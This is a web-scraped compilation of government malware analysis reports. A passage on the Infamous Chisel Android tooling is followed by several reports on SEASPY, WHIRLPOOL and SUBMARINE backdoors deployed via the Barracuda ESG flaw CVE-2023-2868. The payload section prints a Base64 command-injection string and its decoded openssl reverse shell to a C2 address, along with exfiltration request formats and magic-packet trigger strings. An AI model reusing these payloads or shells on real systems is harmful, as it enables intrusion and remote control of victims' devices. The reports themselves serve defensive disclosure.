&lt;p&gt;On most modern systems, an &lt;code&gt;x&lt;/code&gt; in the &lt;code&gt;user password&lt;/code&gt; field is used to denote that the password hash is stored in the &lt;code&gt;/etc/shadow&lt;/code&gt; file that requires root privileges to read. On an Android device, there are typically no such files, so the structure that would usually be retrieved from the &lt;code&gt;passwd&lt;/code&gt; file is generated instead.&lt;/p&gt;
&lt;p&gt;The actor has replaced this function with their own, where if a particular username is seen it returns a hard-coded response. If the expected username is not seen, the &lt;code&gt;/etc/passwd&lt;/code&gt; file is checked for the corresponding username as normal.&lt;/p&gt;
&lt;h5&gt;getpwuid&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;getpwuid&lt;/code&gt; Linux library accepts a uid and returns the corresponding structure above typically from the &lt;code&gt;/etc/passwd&lt;/code&gt; file. The actor has replaced this function to check for the &lt;code&gt;uid&lt;/code&gt; of &lt;code&gt;0xbeef&lt;/code&gt; and return the hard-coded structure detailed above, if found. If &lt;code&gt;0xbeef&lt;/code&gt; is not seen, it will revert to checking &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;
&lt;h5&gt;getspnam&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;getspnam&lt;/code&gt; Linux library function accepts a username and cross-references it with the shadow file usually stored at &lt;code&gt;/etc/shadow&lt;/code&gt; for the corresponding entry that contains the dollar concatenated fields:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;id&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;salt&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hash&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Typically, on an Android device, this function would return NULL, but the actor replacement function uses the Linux version.&lt;/p&gt;
&lt;p&gt;There does not appear to be any modifications other than those detailed above, but there may be other patches implemented.&lt;/p&gt;
&lt;h4&gt;NDBR&lt;/h4&gt;
&lt;p&gt;The &lt;code&gt;NDBR_armv7l&lt;/code&gt; and &lt;code&gt;NDBR_i686&lt;/code&gt; utilities contain multiple individual utilities compiled for ARM and x86 respectively. They both include the above authentication mechanism modification, although with different credentials, and otherwise appear to be the same.&lt;/p&gt;
&lt;p&gt;These utilities also have some functionality overlap with the &lt;code&gt;VPNFilter&lt;/code&gt; malware but appear to be an evolution.&lt;a href="https://www.cisa.gov//blog.talosintelligence.com/vpnfilter-part-3/"&gt;[1]&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;killer&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;killer&lt;/code&gt; is a simple program, the main purpose of which is to terminate &lt;code&gt;netd&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;It achieves this by performing the following steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Iterates through all Process Identifiers (PIDs) in the range 2 through to &lt;code&gt;0x3FFFFF&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Checks the first line of &lt;code&gt;/proc/&amp;lt;pid&amp;gt;/status&lt;/code&gt; for the string &lt;code&gt;netd&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Checks the target of the link referenced at &lt;code&gt;/proc/&amp;lt;pid&amp;gt;/exe&lt;/code&gt; against &lt;code&gt;netd&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Checks the executable name is not &lt;code&gt;netd_&lt;/code&gt; (The legitimate backup executed by the malicious &lt;code&gt;netd&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;Terminates the malicious netd leaving the legitimate &lt;code&gt;netd_&lt;/code&gt; running.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;Communications&lt;/h2&gt;

&lt;h3&gt;netd file exfiltration&lt;/h3&gt;
&lt;p&gt;When a file is to be exfiltrated, a Transport Layer Security (TLS) connection is initiated to a hard-coded local IP and port.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt; This local IP address is likely a local port forward to relay the network traffic over a secure channel, such as a Virtual Private Network (VPN) configured on the device. VPN services are often configured in this way, giving the actor a means to exfiltrate information from the network which blends in with expected encrypted network traffic.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;If a connection to the local IP and port fails, a hard-coded domain is used as a fallback connection. The IP address for this domain is resolved using a request to &lt;code&gt;dns.google&lt;/code&gt;.&lt;/p&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;POST /dns-query HTTP/1.1&lt;/p&gt;
&lt;p&gt;Host: dns.google&lt;/p&gt;
&lt;p&gt;User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0&lt;/p&gt;
&lt;p&gt;Accept: application/dns-message&lt;/p&gt;
&lt;p&gt;Content-Type: application/dns-message&lt;/p&gt;
&lt;p&gt;Content-Length:&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note:&lt;/strong&gt; The hard-coded user agent that relates to a Microsoft Windows operating system would raise suspicion originating from an Android device. But since all the communications are under TLS, it would make inspecting the HTTP headers difficult.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The following HTTP Post request is used to exfiltrate data:&lt;/p&gt;

&lt;table class="tablesaw tablesaw-stack"&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope="col"&gt;
&lt;p&gt;&lt;strong&gt;Data structure&lt;/strong&gt;&lt;/p&gt;
&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;POST /server.php?ver=16&amp;amp;&lt;strong&gt;bid&lt;/strong&gt;=%s&amp;amp;&lt;strong&gt;type&lt;/strong&gt;=%d HTTP/1.1&lt;/p&gt;
&lt;p&gt;User-Agent: curl/7.47&lt;/p&gt;
&lt;p&gt;Host:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Path&lt;/strong&gt;: %s&lt;/p&gt;
&lt;p&gt;Content-Type: application/octet-stream&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Content-Length&lt;/strong&gt;: %d&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;Raw File&amp;gt;&lt;/strong&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;Android ID&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Type: 0 or 1&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;Base64 encoded file path&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p&gt;Content Length of the encoded file to be exfiltrated&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;File contents&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;&amp;nbsp;The Android ID is generated by the initial script run, using the command &lt;code&gt;settings get secure android_id&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Type&lt;/code&gt; denotes the exfiltration type:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0&lt;/code&gt; is used for the file searches, triage script and configurations files.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1&lt;/code&gt; is used for other information such as the Tor domain.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;The Infamous Chisel components are low to medium sophistication and appear to have been developed with little regard to defense evasion or concealment of malicious activity.&lt;/p&gt;
&lt;p&gt;The searching of specific files and directory paths that relate to military applications and exfiltration of this data reinforces the intention to gain access to these networks. Although the components lack basic obfuscation or stealth techniques to disguise activity, the actor may have deemed this not necessary, since many Android devices do not have a host-based detection system.&lt;/p&gt;
&lt;p&gt;Two interesting techniques are present in Infamous Chisel:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the replacement of the legitimate &lt;code&gt;netd&lt;/code&gt; executable to maintain persistence.&lt;/li&gt;
&lt;li&gt;the modification of the authentication function in the components that include &lt;code&gt;dropbear&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These techniques require a good level of C++ knowledge to make the alterations and an awareness of Linux authentication and boot mechanisms.&lt;/p&gt;
&lt;p&gt;Even with the lack of concealment functions, these components present a serious threat because of the impact of the information they can collect.&lt;/p&gt;

&lt;h3&gt;Summary&lt;/h3&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA obtained a variant of the WHIRLPOOL backdoor. The malware was used by threat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting versions 5.1.3.001-9.2.0.006 of Barracuda Email Security Gateway (ESG).&lt;br /&gt;&lt;br /&gt;

&lt;p&gt;The file 'ssld' is a Linux ELF reverse shell and is a variant of WHIRLPOOL malware used on the Barracuda Email Security Gateway (ESG) device (Figure 1). The file looks for an encoded string with a '.io' extension (Figure 2). The string will be decoded and the data will be passed as the C2 which will include the Internet Protocol (IP) address and port number used to establish a reverse shell.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;

&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA obtained four malware samples - including SEASPY and WHIRLPOOL backdoors. The device was compromised by threat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting versions 5.1.3.001-9.2.0.006 of Barracuda Email Security Gateway (ESG).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			SEASPY is a persistent and passive backdoor that masquerades as a legitimate Barracuda service “BarracudaMailService” that allows the threat actors to execute arbitrary commands on the ESG appliance.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			WHIRLPOOL is a backdoor that establishes a Transport Layer Security (TLS) reverse shell to the Command-and-Control (C2) server.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			For information about related malware, specifically information on the initial exploit payload, a second SEASPY backdoor variant, and the SUBMARINE backdoor, see CISA Alert: &lt;a href="https://www.cisa.gov/news-events/alerts/2023/07/28/cisa-releases-malware-analysis-reports-barracuda-backdoors"&gt;CISA Releases Malware Analysis Reports on Barracuda Backdoors&lt;/a&gt;.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 64-bit Executable and Linkable Format (ELF) file that has been identified as a "SEASPY" malware variant installed as a system service. The malware is a persistent backdoor that masquerades as a legitimate Barracuda Networks service. The malware is designed to listen to commands received from the Threat Actor's (TA's) C2 through TCP packets. When executed, the malware uses libpcap sniffer to monitor traffic for a magic packet on TCP port 25 (Simple Mail Transfer Protocol (SMTP)) and TCP port 587. It checks the network packet captured for a hard-coded string "oXmp". When the right sequence of packets is captured, it establishes a TCP reverse shell to the TA's C2 server for further exploitation. This allows the TA to execute arbitrary commands on the compromised system.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The malware is based on an open-source backdoor program named "cd00r" and it is executed using the parameter below:&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin argument--&lt;br /&gt;&lt;br /&gt;
			Usage: "./BarracudaMailService &amp;lt;Network-Interface&amp;gt;"&lt;br /&gt;&lt;br /&gt;
			Sample: "./&amp;lt;malware&amp;gt; eth0"&lt;br /&gt;&lt;br /&gt;
			--End argument--&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is an initialization script. Upon its execution it sets terminal settings to default using the 'stty sane' command. It then runs through the process of setting a runlevel variable and stops other services that were started by a previous runlevel. It also kills any services that are running on the current runlevel. Next, the script will start its associated services at the current runlevel. After logging functionalities are started, the script will then check if the runlevel is 3, which will result in the terminal screen being cleared using /usr/bin/clear. Finally, the script contains the command “/sbin/BarracudaMailService eth0” at the end. BarracudaMailService will be started automatically when the initialization script is run on the network interface eth0. BarracudaMailService is a known name for the SEASPY backdoor.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 64-bit ELF file that has been identified as a "SEASPY" malware variant installed as a system service. This variant of SEASPY has had its symbols stripped. The malware is a persistent backdoor that masquerades as a legitimate Barracuda Networks service. The malware is designed to listen to commands received from the TA's C2 through TCP packets.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			When executed, the malware uses libpcap sniffer to monitor traffic for a magic packet on TCP port 25 (SMTP) and TCP port 587. It checks the network packet captured for a hard-coded string "TfuZ". When the right sequence of packets is captured this SEASPY variant launches an authentication sequence prior to launching the reverse shell. Once the TA authenticates, the malware starts a reverse shell on the infected system. This allows the TA to execute arbitrary commands on the compromised system.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The malware is based on an open-source backdoor program named "cd00r" and it is executed using the parameter below:&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin argument--&lt;br /&gt;&lt;br /&gt;
			Usage: "./BarracudaMailService &amp;lt;Network-Interface&amp;gt;"&lt;br /&gt;&lt;br /&gt;
			Sample: "./&amp;lt;malware&amp;gt; eth0"&lt;br /&gt;&lt;br /&gt;
			--End argument--&lt;/p&gt;

&lt;p&gt;This artifact is a 32-bit ELF file that has been identified as a malware variant named "WHIRLPOOL". The malware takes two arguments (C2 IP and port number) from a module to establish a Transport Layer Security (TLS) reverse shell. The module that passes the arguments was not available for analysis.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA obtained 14 malware samples comprised of Barracuda exploit payloads and reverse shell backdoors. The malware was used by threat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting versions 5.1.3.001-9.2.0.006 of Barracuda Email Security Gateway (ESG).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The payload triggers a command injection (exploiting CVE-2023-2868), leading to dropping and execution of reverse shells on the ESG appliance. The reverse shells establish backdoor communications via OpenSSL with threat actor command and control (C2) servers. The actors delivered this payload to the victim via a phishing email with a malicious .tar attachment.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			For information about related malware, specifically information on other backdoors, see CISA Alert: &lt;a href="https://www.cisa.gov/news-events/alerts/2023/07/28/cisa-releases-malware-analysis-reports-barracuda-backdoors"&gt;CISA Releases Malware Analysis Reports on Barracuda Backdoors&lt;/a&gt;.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This file is related to the vulnerability CVE-2023-2868 in the Barracuda ESG exploit to execute a reverse shell payload on certain ESG appliances. This sample contains a Base64 encoded block that upon decoding references multiple archive files. There are multiple file references in the block, however, only one contains the exploit code in the title and can be found between two single quotes and backticks '`abcdefg=payload`' (Figure 1). This payload triggers a command injection and upon successful exploitation of the affected system the encoded commands are able to run and provide the Threat Actor (TA) with a response.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin Encoded Payload--&lt;br /&gt;&lt;br /&gt;
			'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6ODA4MCA+L3RtcC9wIDI+L2Rldi9udWxsO3JtIC90bXAvcCI=;ee=ba;G=s;"ech"o $abcdefg|${ee}se64 -d|${G}h;wh66489.txt`'&lt;br /&gt;&lt;br /&gt;
			--End Encoded Payload--&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The encoded block above decodes to a reverse shell seen below.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin Decoded Command--&lt;br /&gt;&lt;br /&gt;
			setsid sh -c "mkfifo /tmp/p;sh -i &amp;lt;/tmp/p 2&amp;gt;&amp;amp;1|openssl s_client -quiet -connect 107[.]148[.]223[.]196:8080 &amp;gt;/tmp/p 2&amp;gt;/dev/null;rm /tmp/p"&lt;br /&gt;&lt;br /&gt;
			--End Decoded Command--&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			This reverse shell starts a new session and sets it to run in the background. Then it creates the named pipe "/tmp/p" that it will use as a point to transfer the commands that will be executed.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The rest of the command is seen using OpenSSL to create a client that connects to the Command-and-Control (C2) at Internet Protocol (IP) address “107[.]148[.]223[.]196” and port number “8080.” The OpenSSL command also suppresses session and certificate output info using -quiet flag and errors are discarded for stealth in the /dev/null directory. Finally, the named pipe "tmp/p" is removed when the OpenSSL connection is closed.&lt;/p&gt;

&lt;p&gt;This artifact contains a payload that exploits CVE-2023-2868. The exploit payload is a shell script code with an embedded Base64 encoded reverse shell. Upon execution the malware Base64 decodes and executes the reverse shell code. The reverse shell establishes connections using the "OpenSSL" to the C2 IP "107[.]148[.]223[.]196" and port “443” and redirects the standard input and output to the named pipe at "/tmp/p" and then removes "/tmp/p" after the connection is closed.&lt;br /&gt;&lt;br /&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is dropped by two different .tar files and contains a payload inside its filename that exploits CVE-2023-2868. The exploit payload is a shell script code with an embedded Base64 encoded reverse shell. Upon execution the malware Base64 decodes and executes the reverse shell code. The reverse shells establish connections using the "OpenSSL" to the C2 IP address "107[.]148[.]223[.]196" and ports “8080” or "443." The standard input and output are redirected to the named pipe "/tmp/p" and then removes "tmp/p" after the connection is closed.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The contents within the two dropped files are the same and is a string "oGh7ohc4Akeo8ahXeequei7A09302." This accounts for the two samples having the same hash, however, payload contents are different within the names of these files. When the payload executes, the commands slightly differ in the use of the port number as seen below.&lt;br /&gt;&lt;br /&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact contains a payload that exploits CVE-2023-2868. The exploit payload is a shell script code with an embedded Base64 encoded reverse shell. Upon execution the malware base64 decodes and executes the reverse shell code. The reverse shell establishes connections using the "OpenSSL" to the C2 IP address "107[.]148[.]219[.]54" and port “443” and redirects the standard input and output to the named pipe "/tmp/p" and then removes "/tmp/p" after the connection is closed.&lt;br /&gt;&lt;br /&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additional information on malware incident prevention and handling can be found in National Institute of Standards and Technology (NIST) Special Publication 800-83, &lt;strong&gt;"Guide to Malware Incident Prevention &amp;amp; Handling for Desktops and Laptops".&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA obtained two SEASPY malware samples. The malware was used by threat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting versions 5.1.3.001-9.2.0.006 of Barracuda Email Security Gateway (ESG).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			SEASPY is a persistent and passive backdoor that masquerades as a legitimate Barracuda service “BarracudaMailService” that allows the threat actors to execute arbitrary commands on the ESG appliance.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			For information about related malware, specifically information on the initial exploit payload and other backdoors, see CISA Alert: &lt;a href="https://www.cisa.gov/news-events/alerts/2023/07/28/cisa-releases-malware-analysis-reports-barracuda-backdoors"&gt;CISA Releases Malware Analysis Reports on Barracuda Backdoors&lt;/a&gt;.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 64-bit ELF file that has been identified as a "SEASPY" malware variant installed as a system service. The sample is a persistent backdoor that masquerades as a legitimate Barracuda Networks service. The malware is designed to listen to commands received from the Threat Actor’s (TA) Command-and-Control (C2) through Transmission Control Protocol (TCP) packets. When executed, the malware uses libpcap sniffer to monitor traffic for a magic packet on TCP port 25 (SMTP) and TCP port 587. It checks the network packet captured for a hard-coded string "oXmp". Note: This hard-coded string may change for other SEASPY variants. When the right sequence of packet is captured, it establishes a TCP reverse shell to the TA's C2 server for further exploitation. This allows the TA to execute arbitrary commands on the compromised system.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The malware is based on an open-source backdoor program named "cd00r" and it is executed using the parameter below:&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin argument—&lt;br /&gt;&lt;br /&gt;
			Usage: "./BarracudaMailService &amp;lt;Network-Interface&amp;gt;"&lt;br /&gt;&lt;br /&gt;
			Sample: "./&amp;lt;malware&amp;gt; eth0"&lt;br /&gt;&lt;br /&gt;
			--End argument—&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;This artifact is a 64-bit ELF file that has been identified as a "SEASPY" malware variant installed as a system service. This sample has the sample malicious capabilities as BarracudaMailService.2 (5d6cba7909980a7b424b133fbac634ac). The only difference between the binaries is located in the function named "start_pcap_listener". In the function "start_pcap_listener" both binaries call a function named "reverse shell" to start the reverse shell functionality of the malware. The difference is that BarracudaMailService.1 (32ffe48d1a8ced49c53033eb65eff6f3) jumps directly to the set of instructions that start the reverse shell, as opposed to BarracudaMailService.2 (5d6cba7909980a7b424b133fbac634ac), which contains an extra set of instructions before jumping to the instructions that start the reverse shell.&lt;/p&gt;
&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;Summary&lt;/h3&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;CISA obtained seven malware samples related to a novel backdoor CISA has named SUBMARINE. The malware was used by threat actors exploiting CVE-2023-2868, a former zero-day vulnerability affecting certain versions 5.1.3.001 - 9.2.0.006 of Barracuda Email Security Gateway (ESG).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			SUBMARINE is a novel persistent backdoor that lives in a Structured Query Language (SQL) database on the ESG appliance. SUBMARINE comprises multiple artifacts that, in a multi-step process, enable execution with root privileges, persistence, command and control, and cleanup. In addition to SUBMARINE, CISA obtained associated Multipurpose Internet Mail Extensions (MIME) attachment files from the victim. These files contained the contents of the compromised SQL database, which included sensitive information.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			For information about related malware, specifically information on the initial exploit payload and other backdoors, see CISA Alert: &lt;a href="https://www.cisa.gov/news-events/alerts/2023/07/28/cisa-releases-malware-analysis-reports-barracuda-backdoors"&gt;CISA Releases Malware Analysis Reports on Barracuda Backdoors&lt;/a&gt;.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
